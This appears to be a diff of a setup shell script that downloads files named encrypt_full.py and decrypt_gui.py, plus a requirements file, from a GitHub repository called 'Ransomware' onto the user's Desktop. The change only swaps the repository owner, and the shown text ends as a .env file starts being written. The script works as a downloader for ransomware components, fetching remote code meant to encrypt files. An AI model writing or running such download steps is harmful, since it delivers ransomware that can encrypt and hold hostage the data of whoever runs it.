@@ -3,11 +3,11 @@
 cd ~/Desktop || exit
 
 # Download Python files
-wget https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_full.py
-wget https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py
+wget https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/main/encrypt_full.py
+wget https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/main/decrypt_gui.py
 
 # Download requirements.txt from GitHub
-wget https://raw.githubusercontent.com/Google-design/Ransomware/main/requirements.txt
+wget https://raw.githubusercontent.com/Abdullah-k0de/Ransomware/main/requirements.txt
 
 # Create the .env file
 cat <<EOF > .env
